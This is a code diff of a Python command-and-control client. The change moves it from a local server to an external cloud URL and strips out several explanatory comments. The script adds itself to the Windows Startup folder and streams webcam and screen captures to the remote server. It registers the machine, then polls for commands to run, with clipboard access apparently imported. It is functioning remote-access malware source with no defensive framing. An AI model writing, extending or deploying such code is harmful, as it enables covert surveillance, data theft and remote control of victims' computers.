@@ -1,40 +1,36 @@
 #!/usr/bin/env python3
 """
-🎯 VISIBLE LOCAL C2 CLIENT
-✅ Window stays visible
-✅ Auto-starts on Windows boot
-✅ Camera & Screen capture
+🎯 CLOUD C2 CLIENT - PXXL VERSION
 """
-import requests, subprocess, platform, time, uuid, os, sys
+import requests, subprocess, platform, time, uuid, os
 import threading
-import cv2, mss, numpy as np
+import base64
 import pyperclip
+import cv2
+import mss
+import numpy as np
 
 # ============================================================
-# CONFIGURATION
+# YOUR PXXL URL
 # ============================================================
-# NOTE: If you deploy the server to Pxxl later, change this URL.
-C2_URL = "http://127.0.0.1:5000" 
+C2_URL = "https://c23.pxxlspace.cv"
 CLIENT_ID = str(uuid.uuid4())[:8]
 
 # ============================================================
-# AUTO-START ON BOOT (Keeps window visible)
+# AUTO-START ON BOOT
 # ============================================================
 def add_to_startup():
-    """Add this script to startup, keeping the console window visible."""
     if platform.system() == 'Windows':
         script_path = os.path.abspath(__file__)
         startup_folder = os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
-        bat_path = os.path.join(startup_folder, 'local_c2_start.bat')
+        bat_path = os.path.join(startup_folder, 'c23_client_start.bat')
         
-        # We use 'python' instead of 'pythonw' so the window remains visible
         with open(bat_path, 'w') as f:
             f.write(f'@echo off\n')
-            f.write(f'title Local C2 Client - {platform.node()}\n')
+            f.write(f'title Cloud C2 Client - {platform.node()}\n')
             f.write(f'python "{script_path}"\n')
         
-        print(f"[+] Auto-start installed (Visible Window).")
-        print(f"[+] Path: {bat_path}")
+        print(f"[+] Auto-start installed.")
 
 # ============================================================
 # COMMUNICATION
@@ -43,19 +39,19 @@ def register():
     try:
         requests.post(f"{C2_URL}/register", json={
             'client_id': CLIENT_ID, 'hostname': platform.node(), 'os': platform.system()
-        }, timeout=3)
+        }, timeout=5)
     except: pass
 
 def get_command():
     try:
-        r = requests.get(f"{C2_URL}/get_command/{CLIENT_ID}", timeout=3)
+        r = requests.get(f"{C2_URL}/get_command/{CLIENT_ID}", timeout=5)
         if r.status_code == 200: return r.json().get('command')
     except: pass
     return None
 
 def send_result(cmd, out):
     try: 
-        requests.post(f"{C2_URL}/send_result", json={'client_id': CLIENT_ID, 'command': cmd, 'output': out}, timeout=3)
+        requests.post(f"{C2_URL}/send_result", json={'client_id': CLIENT_ID, 'command': cmd, 'output': out}, timeout=5)
     except: pass
 
 # ============================================================
@@ -63,6 +59,10 @@ def send_result(cmd, out):
 # ============================================================
 def camera_worker():
     cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        print("[-] Could not open webcam.")
+        return
+        
     while True:
         ret, frame = cap.read()
         if ret:
@@ -70,9 +70,9 @@ def camera_worker():
             _, buffer = cv2.imencode('.jpg', frame)
             b64 = base64.b64encode(buffer).decode()
             try: 
-                requests.post(f"{C2_URL}/stream_frame/{CLIENT_ID}/camera", json={'image': b64}, timeout=1)
+                requests.post(f"{C2_URL}/stream_frame/{CLIENT_ID}/camera", json={'image': b64}, timeout=3)
             except: pass
-        time.sleep(0.1)
+        time.sleep(0.5)
 
 def screen_worker():
     with mss.mss() as sct:
@@ -84,9 +84,9 @@ def screen_worker():
                 frame = cv2.resize(frame, (640, 360))
                 _, buffer = cv2.imencode('.jpg', frame)
                 b64 = base64.b64encode(buffer).decode()
-                requests.post(f"{C2_URL}/stream_frame/{CLIENT_ID}/screen", json={'image': b64}, timeout=1)
+                requests.post(f"{C2_URL}/stream_frame/{CLIENT_ID}/screen", json={'image': b64}, timeout=3)
             except: pass
-            time.sleep(0.2)
+            time.sleep(1)
 
 # ============================================================
 # COMMAND PROCESSOR
@@ -116,16 +116,14 @@ def execute_command(cmd):
 # MAIN
 # ============================================================
 if __name__ == '__main__':
-    # 1. Add to startup automatically
     add_to_startup()
     
-    # 2. Set the window title so it's obvious
     if platform.system() == 'Windows':
-        os.system(f'title LOCAL C2 CLIENT - {CLIENT_ID} - DO NOT CLOSE')
+        os.system(f'title CLOUD C2 CLIENT - {CLIENT_ID} - DO NOT CLOSE')
     
     print(f"""
 ╔═══════════════════════════════════════════════════════════════════╗
-║   🎯 LOCAL C2 CLIENT RUNNING                                      ║
+║   🎯 CLOUD C2 CLIENT RUNNING                                      ║
 ║                                                                   ║
 ║   ID: {CLIENT_ID}                                                       ║
 ║   Server: {C2_URL}                            ║
@@ -135,15 +133,12 @@ if __name__ == '__main__':
 ╚═══════════════════════════════════════════════════════════════════╝
     """)
     
-    # 3. Start background threads
     threading.Thread(target=camera_worker, daemon=True).start()
     threading.Thread(target=screen_worker, daemon=True).start()
     
-    # 4. Register
     register()
     print("[+] Registered with server. Waiting for commands...")
     
-    # 5. Main loop
     while True:
         try:
             cmd = get_command()
